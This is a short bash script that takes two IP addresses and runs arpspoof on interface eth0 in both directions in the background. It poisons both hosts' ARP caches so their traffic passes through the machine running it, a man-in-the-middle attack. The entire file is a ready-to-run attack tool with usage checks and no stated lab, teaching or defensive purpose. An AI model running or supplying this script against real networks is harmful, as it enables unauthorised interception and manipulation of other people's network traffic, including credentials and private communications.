# Ensure at least two IP addresses are passed
if [ $# -ne 2 ]; then
    echo "Usage: $0 <FIRST_IP> <SECOND_IP>"
    exit 1
fi

# Extract the input IPs
FIRST_IP=$1
SECOND_IP=$2

# Echo the spoofing actions
echo "Spoofing from $FIRST_IP to $SECOND_IP"
arpspoof -i eth0 -t $FIRST_IP $SECOND_IP &

echo "Spoofing from $SECOND_IP to $FIRST_IP"
arpspoof -i eth0 -t $SECOND_IP $FIRST_IP &

echo "ARP Spoofing sessions are running."
